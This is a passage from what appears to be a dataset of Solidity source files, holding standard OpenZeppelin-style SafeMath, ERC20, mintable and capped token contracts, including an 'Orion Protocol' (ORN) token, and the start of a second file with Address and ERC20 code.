(uint256) {\n\n        require(b <= a, errorMessage);\n\n        uint256 c = a - b;\n\n\n\n        return c;\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the multiplication of two unsigned integers, reverting on\n\n     * overflow.\n\n     *\n\n     * Counterpart to Solidity\'s `*` operator.\n\n     *\n\n     * Requirements:\n\n     * - Multiplication cannot overflow.\n\n     */\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n\n        // Gas optimization: this is cheaper than requiring \'a\' not being zero, but the\n\n        // benefit is lost if \'b\' is also tested.\n\n        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n\n        if (a == 0) {\n\n            return 0;\n\n        }\n\n\n\n        uint256 c = a * b;\n\n        require(c / a == b, "SafeMath: multiplication overflow");\n\n\n\n        return c;\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the integer division of two unsigned integers. Reverts on\n\n     * division by zero. The result is rounded towards zero.\n\n     *\n\n     * Counterpart to Solidity\'s `/` operator. Note: this function uses a\n\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n\n     * uses an invalid opcode to revert (consuming all remaining gas).\n\n     *\n\n     * Requirements:\n\n     * - The divisor cannot be zero.\n\n     */\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n\n        return div(a, b, "SafeMath: division by zero");\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on\n\n     * division by zero. The result is rounded towards zero.\n\n     *\n\n     * Counterpart to Solidity\'s `/` operator. Note: this function uses a\n\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n\n     * uses an invalid opcode to revert (consuming all remaining gas).\n\n     *\n\n     * Requirements:\n\n     * - The divisor cannot be zero.\n\n     *\n\n     * _Available since v2.4.0._\n\n     */\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n\n        // Solidity only automatically asserts when dividing by 0\n\n        require(b > 0, errorMessage);\n\n        uint256 c = a / b;\n\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\n\n\n\n        return c;\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n\n     * Reverts when dividing by zero.\n\n     *\n\n     * Counterpart to Solidity\'s `%` operator. This function uses a `revert`\n\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n\n     * invalid opcode to revert (consuming all remaining gas).\n\n     *\n\n     * Requirements:\n\n     * - The divisor cannot be zero.\n\n     */\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n\n        return mod(a, b, "SafeMath: modulo by zero");\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n\n     * Reverts with custom message when dividing by zero.\n\n     *\n\n     * Counterpart to Solidity\'s `%` operator. This function uses a `revert`\n\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n\n     * invalid opcode to revert (consuming all remaining gas).\n\n     *\n\n     * Requirements:\n\n     * - The divisor cannot be zero.\n\n     *\n\n     * _Available since v2.4.0._\n\n     */\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n\n        require(b != 0, errorMessage);\n\n        return a % b;\n\n    }\n\n}\n\ncontract ERC20 is Context, IERC20 {\n\n    using SafeMath for uint256;\n\n\n\n    mapping (address => uint256) private _balances;\n\n\n\n    mapping (address => mapping (address => uint256)) private _allowances;\n\n\n\n    uint256 private _totalSupply;\n\n\n\n    /**\n\n     * @dev See {IERC20-totalSupply}.\n\n     */\n\n    function totalSupply() public view returns (uint256) {\n\n        return _totalSupply;\n\n    }\n\n\n\n    /**\n\n     * @dev See {IERC20-balanceOf}.\n\n     */\n\n    function balanceOf(address account) public view returns (uint256) {\n\n        return _balances[account];\n\n    }\n\n\n\n    /**\n\n     * @dev See {IERC20-transfer}.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - `recipient` cannot be the zero address.\n\n     * - the caller must have a balance of at least `amount`.\n\n     */\n\n    function transfer(address recipient, uint256 amount) public returns (bool) {\n\n        _transfer(_msgSender(), recipient, amount);\n\n        return true;\n\n    }\n\n\n\n    /**\n\n     * @dev See {IERC20-allowance}.\n\n     */\n\n    function allowance(address owner, address spender) public view returns (uint256) {\n\n        return _allowances[owner][spender];\n\n    }\n\n\n\n    /**\n\n     * @dev See {IERC20-approve}.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - `spender` cannot be the zero address.\n\n     */\n\n    function approve(address spender, uint256 amount) public returns (bool) {\n\n        _approve(_msgSender(), spender, amount);\n\n        return true;\n\n    }\n\n\n\n    /**\n\n     * @dev See {IERC20-transferFrom}.\n\n     *\n\n     * Emits an {Approval} event indicating the updated allowance. This is not\n\n     * required by the EIP. See the note at the beginning of {ERC20};\n\n     *\n\n     * Requirements:\n\n     * - `sender` and `recipient` cannot be the zero address.\n\n     * - `sender` must have a balance of at least `amount`.\n\n     * - the caller must have allowance for `sender`\'s tokens of at least\n\n     * `amount`.\n\n     */\n\n    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\n\n        _transfer(sender, recipient, amount);\n\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));\n\n        return true;\n\n    }\n\n\n\n    /**\n\n     * @dev Atomically increases the allowance granted to `spender` by the caller.\n\n     *\n\n     * This is an alternative to {approve} that can be used as a mitigation for\n\n     * problems described in {IERC20-approve}.\n\n     *\n\n     * Emits an {Approval} event indicating the updated allowance.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - `spender` cannot be the zero address.\n\n     */\n\n    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\n\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\n\n        return true;\n\n    }\n\n\n\n    /**\n\n     * @dev Atomically decreases the allowance granted to `spender` by the caller.\n\n     *\n\n     * This is an alternative to {approve} that can be used as a mitigation for\n\n     * problems described in {IERC20-approve}.\n\n     *\n\n     * Emits an {Approval} event indicating the updated allowance.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - `spender` cannot be the zero address.\n\n     * - `spender` must have allowance for the caller of at least\n\n     * `subtractedValue`.\n\n     */\n\n    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {\n\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));\n\n        return true;\n\n    }\n\n\n\n    /**\n\n     * @dev Moves tokens `amount` from `sender` to `recipient`.\n\n     *\n\n     * This is internal function is equivalent to {transfer}, and can be used to\n\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n\n     *\n\n     * Emits a {Transfer} event.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - `sender` cannot be the zero address.\n\n     * - `recipient` cannot be the zero address.\n\n     * - `sender` must have a balance of at least `amount`.\n\n     */\n\n    function _transfer(address sender, address recipient, uint256 amount) internal {\n\n        require(sender != address(0), "ERC20: transfer from the zero address");\n\n        require(recipient != address(0), "ERC20: transfer to the zero address");\n\n\n\n        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");\n\n        _balances[recipient] = _balances[recipient].add(amount);\n\n        emit Transfer(sender, recipient, amount);\n\n    }\n\n\n\n    /** @dev Creates `amount` tokens and assigns them to `account`, increasing\n\n     * the total supply.\n\n     *\n\n     * Emits a {Transfer} event with `from` set to the zero address.\n\n     *\n\n     * Requirements\n\n     *\n\n     * - `to` cannot be the zero address.\n\n     */\n\n    function _mint(address account, uint256 amount) internal {\n\n        require(account != address(0), "ERC20: mint to the zero address");\n\n\n\n        _totalSupply = _totalSupply.add(amount);\n\n        _balances[account] = _balances[account].add(amount);\n\n        emit Transfer(address(0), account, amount);\n\n    }\n\n\n\n    /**\n\n     * @dev Destroys `amount` tokens from `account`, reducing the\n\n     * total supply.\n\n     *\n\n     * Emits a {Transfer} event with `to` set to the zero address.\n\n     *\n\n     * Requirements\n\n     *\n\n     * - `account` cannot be the zero address.\n\n     * - `account` must have at least `amount` tokens.\n\n     */\n\n    function _burn(address account, uint256 amount) internal {\n\n        require(account != address(0), "ERC20: burn from the zero address");\n\n\n\n        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");\n\n        _totalSupply = _totalSupply.sub(amount);\n\n        emit Transfer(account, address(0), amount);\n\n    }\n\n\n\n    /**\n\n     * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.\n\n     *\n\n     * This is internal function is equivalent to `approve`, and can be used to\n\n     * e.g. set automatic allowances for certain subsystems, etc.\n\n     *\n\n     * Emits an {Approval} event.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - `owner` cannot be the zero address.\n\n     * - `spender` cannot be the zero address.\n\n     */\n\n    function _approve(address owner, address spender, uint256 amount) internal {\n\n        require(owner != address(0), "ERC20: approve from the zero address");\n\n        require(spender != address(0), "ERC20: approve to the zero address");\n\n\n\n        _allowances[owner][spender] = amount;\n\n        emit Approval(owner, spender, amount);\n\n    }\n\n\n\n    /**\n\n     * @dev Destroys `amount` tokens from `account`.`amount` is then deducted\n\n     * from the caller\'s allowance.\n\n     *\n\n     * See {_burn} and {_approve}.\n\n     */\n\n    function _burnFrom(address account, uint256 amount) internal {\n\n        _burn(account, amount);\n\n        _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "ERC20: burn amount exceeds allowance"));\n\n    }\n\n}\n\ncontract ERC20Detailed is IERC20 {\n\n    string private _name;\n\n    string private _symbol;\n\n    uint8 private _decimals;\n\n\n\n    /**\n\n     * @dev Sets the values for `name`, `symbol`, and `decimals`. All three of\n\n     * these values are immutable: they can only be set once during\n\n     * construction.\n\n     */\n\n    constructor (string memory name, string memory symbol, uint8 decimals) public {\n\n        _name = name;\n\n        _symbol = symbol;\n\n        _decimals = decimals;\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the name of the token.\n\n     */\n\n    function name() public view returns (string memory) {\n\n        return _name;\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the symbol of the token, usually a shorter version of the\n\n     * name.\n\n     */\n\n    function symbol() public view returns (string memory) {\n\n        return _symbol;\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the number of decimals used to get its user representation.\n\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n\n     * be displayed to a user as `5,05` (`505 / 10 ** 2`).\n\n     *\n\n     * Tokens usually opt for a value of 18, imitating the relationship between\n\n     * Ether and Wei.\n\n     *\n\n     * NOTE: This information is only used for _display_ purposes: it in\n\n     * no way affects any of the arithmetic of the contract, including\n\n     * {IERC20-balanceOf} and {IERC20-transfer}.\n\n     */\n\n    function decimals() public view returns (uint8) {\n\n        return _decimals;\n\n    }\n\n}\n\ncontract ERC20Mintable is ERC20, MinterRole {\n\n    /**\n\n     * @dev See {ERC20-_mint}.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - the caller must have the {MinterRole}.\n\n     */\n\n    function mint(address account, uint256 amount) public onlyMinter returns (bool) {\n\n        _mint(account, amount);\n\n        return true;\n\n    }\n\n}\n\ncontract ERC20Capped is ERC20Mintable {\n\n    uint256 private _cap;\n\n\n\n    /**\n\n     * @dev Sets the value of the `cap`. This value is immutable, it can only be\n\n     * set once during construction.\n\n     */\n\n    constructor (uint256 cap) public {\n\n        require(cap > 0, "ERC20Capped: cap is 0");\n\n        _cap = cap;\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the cap on the token\'s total supply.\n\n     */\n\n    function cap() public view returns (uint256) {\n\n        return _cap;\n\n    }\n\n\n\n    /**\n\n     * @dev See {ERC20Mintable-mint}.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - `value` must not cause the total supply to go over the cap.\n\n     */\n\n    function _mint(address account, uint256 value) internal {\n\n        require(totalSupply().add(value) <= _cap, "ERC20Capped: cap exceeded");\n\n        super._mint(account, value);\n\n    }\n\n}\n\ncontract OrionToken is ERC20Detailed, ERC20Capped {\n\n    constructor()\n\n        public\n\n        ERC20Detailed("Orion Protocol", "ORN", 8)\n\n        ERC20Capped(100e6 * 1e8)\n\n    {}\n\n}\n', 'pragma solidity 0.6.6;\n\nlibrary Address {\n\n    /**\n\n     * @dev Returns true if `account` is a contract.\n\n     *\n\n     * [IMPORTANT]\n\n     * ====\n\n     * It is unsafe to assume that an address for which this function returns\n\n     * false is an externally-owned account (EOA) and not a contract.\n\n     *\n\n     * Among others, `isContract` will return false for the following\n\n     * types of addresses:\n\n     *\n\n     *  - an externally-owned account\n\n     *  - a contract in construction\n\n     *  - an address where a contract will be created\n\n     *  - an address where a contract lived, but was destroyed\n\n     * ====\n\n     */\n\n    function isContract(address account) internal view returns (bool) {\n\n        // This method relies on extcodesize, which returns 0 for contracts in\n\n        // construction, since the code is only stored at the end of the\n\n        // constructor execution.\n\n\n\n        uint256 size;\n\n        // solhint-disable-next-line no-inline-assembly\n\n        assembly { size := extcodesize(account) }\n\n        return size > 0;\n\n    }\n\n\n\n    /**\n\n     * @dev Replacement for Solidity\'s `transfer`: sends `amount` wei to\n\n     * `recipient`, forwarding all available gas and reverting on errors.\n\n     *\n\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\n\n     * imposed by `transfer`, making them unable to receive funds via\n\n     * `transfer`. {sendValue} removes this limitation.\n\n     *\n\n     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n\n     *\n\n     * IMPORTANT: because control is transferred to `recipient`, care must be\n\n     * taken to not create reentrancy vulnerabilities. Consider using\n\n     * {ReentrancyGuard} or the\n\n     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\n\n     */\n\n    function sendValue(address payable recipient, uint256 amount) internal {\n\n        require(address(this).balance >= amount, "Address: insufficient balance");\n\n\n\n        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value\n\n        (bool success, ) = recipient.call{ value: amount }("");\n\n        require(success, "Address: unable to send value, recipient may have reverted");\n\n    }\n\n\n\n    /**\n\n     * @dev Performs a Solidity function call using a low level `call`. A\n\n     * plain`call` is an unsafe replacement for a function call: use this\n\n     * function instead.\n\n     *\n\n     * If `target` reverts with a revert reason, it is bubbled up by this\n\n     * function (like regular Solidity function calls).\n\n     *\n\n     * Returns the raw returned data. To convert to the expected return value,\n\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - `target` must be a contract.\n\n     * - calling `target` with `data` must not revert.\n\n     *\n\n     * _Available since v3.1._\n\n     */\n\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\n\n      return functionCall(target, data, "Address: low-level call failed");\n\n    }\n\n\n\n    /**\n\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with\n\n     * `errorMessage` as a fallback revert reason when `target` reverts.\n\n     *\n\n     * _Available since v3.1._\n\n     */\n\n    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\n\n        return _functionCallWithValue(target, data, 0, errorMessage);\n\n    }\n\n\n\n    /**\n\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n\n     * but also transferring `value` wei to `target`.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - the calling contract must have an ETH balance of at least `value`.\n\n     * - the called Solidity function must be `payable`.\n\n     *\n\n     * _Available since v3.1._\n\n     */\n\n    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {\n\n        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");\n\n    }\n\n\n\n    /**\n\n     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but\n\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\n\n     *\n\n     * _Available since v3.1._\n\n     */\n\n    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {\n\n        require(address(this).balance >= value, "Address: insufficient balance for call");\n\n        return _functionCallWithValue(target, data, value, errorMessage);\n\n    }\n\n\n\n    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {\n\n        require(isContract(target), "Address: call to non-contract");\n\n\n\n        // solhint-disable-next-line avoid-low-level-calls\n\n        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);\n\n        if (success) {\n\n            return returndata;\n\n        } else {\n\n            // Look for revert reason and bubble it up if present\n\n            if (returndata.length > 0) {\n\n                // The easiest way to bubble the revert reason is using memory via assembly\n\n\n\n                // solhint-disable-next-line no-inline-assembly\n\n                assembly {\n\n                    let returndata_size := mload(returndata)\n\n                    revert(add(32, returndata), returndata_size)\n\n                }\n\n            } else {\n\n                revert(errorMessage);\n\n            }\n\n        }\n\n    }\n\n}\n\nabstract contract Context {\n\n    function _msgSender() internal view virtual returns (address payable) {\n\n        return msg.sender;\n\n    }\n\n\n\n    function _msgData() internal view virtual returns (bytes memory) {\n\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\n\n        return msg.data;\n\n    }\n\n}\n\ninterface IERC20 {\n\n    /**\n\n     * @dev Returns the amount of tokens in existence.\n\n     */\n\n    function totalSupply() external view returns (uint256);\n\n\n\n    /**\n\n     * @dev Returns the amount of tokens owned by `account`.\n\n     */\n\n    function balanceOf(address account) external view returns (uint256);\n\n\n\n    /**\n\n     * @dev Moves `amount` tokens from the caller\'s account to `recipient`.\n\n     *\n\n     * Returns a boolean value indicating whether the operation succeeded.\n\n     *\n\n     * Emits a {Transfer} event.\n\n     */\n\n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n\n\n    /**\n\n     * @dev Returns the remaining number of tokens that `spender` will be\n\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n\n     * zero by default.\n\n     *\n\n     * This value changes when {approve} or {transferFrom} are called.\n\n     */\n\n    function allowance(address owner, address spender) external view returns (uint256);\n\n\n\n    /**\n\n     * @dev Sets `amount` as the allowance of `spender` over the caller\'s tokens.\n\n     *\n\n     * Returns a boolean value indicating whether the operation succeeded.\n\n     *\n\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n\n     * that someone may use both the old and the new allowance by unfortunate\n\n     * transaction ordering. One possible solution to mitigate this race\n\n     * condition is to first reduce the spender\'s allowance to 0 and set the\n\n     * desired value afterwards:\n\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n\n     *\n\n     * Emits an {Approval} event.\n\n     */\n\n    function approve(address spender, uint256 amount) external returns (bool);\n\n\n\n    /**\n\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\n\n     * allowance mechanism. `amount` is then deducted from the caller\'s\n\n     * allowance.\n\n     *\n\n     * Returns a boolean value indicating whether the operation succeeded.\n\n     *\n\n     * Emits a {Transfer} event.\n\n     */\n\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n\n\n    /**\n\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n\n     * another (`to`).\n\n     *\n\n     * Note that `value` may be zero.\n\n     */\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n\n\n    /**\n\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n\n     * a call to {approve}. `value` is the new allowance.\n\n     */\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n}\n\nlibrary SafeMath {\n\n    /**\n\n     * @dev Returns the addition of two unsigned integers, reverting on\n\n     * overflow.\n\n     *\n\n     * Counterpart to Solidity\'s `+` operator.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - Addition cannot overflow.\n\n     */\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n\n        uint256 c = a + b;\n\n        require(c >= a, "SafeMath: addition overflow");\n\n\n\n        return c;\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the subtraction of two unsigned integers, reverting on\n\n     * overflow (when the result is negative).\n\n     *\n\n     * Counterpart to Solidity\'s `-` operator.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - Subtraction cannot overflow.\n\n     */\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n\n        return sub(a, b, "SafeMath: subtraction overflow");\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n\n     * overflow (when the result is negative).\n\n     *\n\n     * Counterpart to Solidity\'s `-` operator.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - Subtraction cannot overflow.\n\n     */\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n\n        require(b <= a, errorMessage);\n\n        uint256 c = a - b;\n\n\n\n        return c;\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the multiplication of two unsigned integers, reverting on\n\n     * overflow.\n\n     *\n\n     * Counterpart to Solidity\'s `*` operator.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - Multiplication cannot overflow.\n\n     */\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n\n        // Gas optimization: this is cheaper than requiring \'a\' not being zero, but the\n\n        // benefit is lost if \'b\' is also tested.\n\n        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n\n        if (a == 0) {\n\n            return 0;\n\n        }\n\n\n\n        uint256 c = a * b;\n\n        require(c / a == b, "SafeMath: multiplication overflow");\n\n\n\n        return c;\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the integer division of two unsigned integers. Reverts on\n\n     * division by zero. The result is rounded towards zero.\n\n     *\n\n     * Counterpart to Solidity\'s `/` operator. Note: this function uses a\n\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n\n     * uses an invalid opcode to revert (consuming all remaining gas).\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - The divisor cannot be zero.\n\n     */\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n\n        return div(a, b, "SafeMath: division by zero");\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on\n\n     * division by zero. The result is rounded towards zero.\n\n     *\n\n     * Counterpart to Solidity\'s `/` operator. Note: this function uses a\n\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n\n     * uses an invalid opcode to revert (consuming all remaining gas).\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - The divisor cannot be zero.\n\n     */\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n\n        require(b > 0, errorMessage);\n\n        uint256 c = a / b;\n\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\n\n\n\n        return c;\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n\n     * Reverts when dividing by zero.\n\n     *\n\n     * Counterpart to Solidity\'s `%` operator. This function uses a `revert`\n\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n\n     * invalid opcode to revert (consuming all remaining gas).\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - The divisor cannot be zero.\n\n     */\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n\n        return mod(a, b, "SafeMath: modulo by zero");\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n\n     * Reverts with custom message when dividing by zero.\n\n     *\n\n     * Counterpart to Solidity\'s `%` operator. This function uses a `revert`\n\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n\n     * invalid opcode to revert (consuming all remaining gas).\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - The divisor cannot be zero.\n\n     */\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n\n        require(b != 0, errorMessage);\n\n        return a % b;\n\n    }\n\n}\n\ncontract ERC20 is Context, IERC20 {\n\n    using SafeMath for uint256;\n\n    using Address for address;\n\n\n\n    mapping (address => uint256) private _balances;\n\n\n\n    mapping (address => mapping (address => uint256)) private _allowances;\n\n\n\n    uint256 private _totalSupply;\n\n\n\n    string private _name;\n\n    string private _symbol;\n\n    uint8 private _decimals;\n\n\n\n    /**\n\n     * @dev Sets the values for {name} and {symbol}, initializes {decimals} with\n\n     * a default value of 18.\n\n     *\n\n     * To select a different value for {decimals}, use {_setupDecimals}.\n\n     *\n\n     * All three of these values are immutable: they can only be set once during\n\n     * construction.\n\n     */\n\n    constructor (string memory name, string memory symbol) public {\n\n        _name = name;\n\n        _symbol = symbol;\n\n        _decimals = 18;\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the name of the token.\n\n     */\n\n    function name() public view returns (string memory) {\n\n        return _name;\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the symbol of the token, usually a shorter version of the\n\n     * name.\n\n     */\n\n    function symbol() public view returns (string memory) {\n\n        return _symbol;\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the number of decimals used to get its user representation.\n\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n\n     * be displayed to a user as `5,05` (`505 / 10 ** 2`).\n\n     *\n\n     * Tokens usually opt for a value of 18, imitating the relationship between\n\n     * Ether and Wei. This is the value {ERC20} uses, unless {_setupDecimals} is\n\n     * called.\n\n     *\n\n     * NOTE: This information is only used for _display_ purposes: it in\n\n     * no way affects any of the arithmetic of the contract, including\n\n     * {IERC20-balanceOf} and {IERC20-transfer}.\n\n     */\n\n    function decimals() public view returns (uint8) {\n\n        return _decimals;\n\n    }\n\n\n\n    /**\n\n     * @dev See {IERC20-totalSupply}.\n\n     */\n\n    function totalSupply() public view override returns (uint256) {\n\n        return _totalSupply;\n\n    }\n\n\n\n    /**\n\n     * @dev See {IERC20-balanceOf}.\n\n     */\n\n    function balanceOf(address account) public view override returns (uint256) {\n\n        return _balances[account];\n\n    }\n\n\n\n    /**\n\n     * @dev See {IERC20-transfer}.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - `recipient` cannot be the zero address.\n\n     * - the caller must have a balance of at least `amount`.\n\n     */\n\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n\n        _transfer(_msgSender(), recipient, amount);\n\n        return true;\n\n    }\n\n\n\n    /**\n\n     * @dev See {IERC20-allowance}.\n\n     */\n\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n\n        return _allowances[owner][spender];\n\n    }\n\n\n\n    /**\n\n     * @dev See {IERC20-approve}.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - `spender` cannot be the zero address.\n\n     */\n\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n\n        _approve(_msgSender(), spender, amount);\n\n        return true;\n\n    }\n\n\n\n    /**\n\n     * @dev See {IERC20-transferFrom}.\n\n     *\n\n     * Emits an {Approval} event indicating the updated allowance. This is not\n\n     * required by the EIP. See the note at the beginning of {ERC20};\n\n     *\n\n     * Requirements:\n\n     * - `sender` and `recipient` cannot be the zero address.\n\n     * - `sender` must have a balance of at least `amount`.\n\n     * - the caller must have allowance for ``sender``\'s tokens of at least\n\n     * `amount`.\n\n     */\n\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n\n        _transfer(sender, recipient, amount);\n\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));\n\n        return true;\n\n    }\n\n\n\n    /**\n\n     * @dev Atomically increases the allowance granted to `spender` by the caller.\n\n     *\n\n     * This is an alternative to {approve} that can be used as a mitigation for\n\n     * problems described in {IERC20-approve}.\n\n     *\n\n     * Emits an {Approval} event indicating the updated allowance.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - `spender` cannot be the zero address.\n\n     */\n\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\n\n        return true;\n\n    }\n\n\n\n    /**\n\n     * @dev Atomically decreases the allowance granted to `spender` by the caller.\n\n     *\n\n     * This is an alternative to {approve} that can be used as a mitigation for\n\n     * problems described in {IERC20-approve}.\n\n     *\n\n     * Emits an {Approval} event indicating the updated allowance.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - `spender` cannot be the zero address.\n\n     * - `spender` must have allowance for the caller of at least\n\n     * `subtractedValue`.\n\n     */\n\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));\n\n        return true;\n\n    }\n\n\n\n    /**\n\n     * @dev Moves tokens `amount` from `sender` to `recipient`.\n\n     *\n\n     * This is internal function is equivalent to {transfer}, and can be used to\n\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n\n     *\n\n     * Emits a {Transfer} event.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - `sender` cannot be the zero address.\n\n     * - `recipient` cannot be the zero address.\n\n     * - `sender` must have a balance of at least `amount`.\n\n     */\n\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n\n        require(sender != address(0), "ERC20: transfer from the zero address");\n\n        require(recipient != address(0), "ERC20: transfer to the zero address");\n\n\n\n        _beforeTokenTransfer(sender, recipient, amount);\n\n\n\n        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");\n\n        _balances[recipient] = _balances[recipient].add(amount);\n\n        emit Transfer(sender, recipient, amount);\n\n    }\n\n\n\n    /** @dev Creates `amount` tokens and assigns them to `account`, increasing\n\n     * the total supply.\n\n     *\n\n     * Emits a {Transfer} event with `from` set to the zero address.\n\n     *\n\n     * Requirements\n\n     *\n\n     * - `to` cannot be the zero address.\n\n     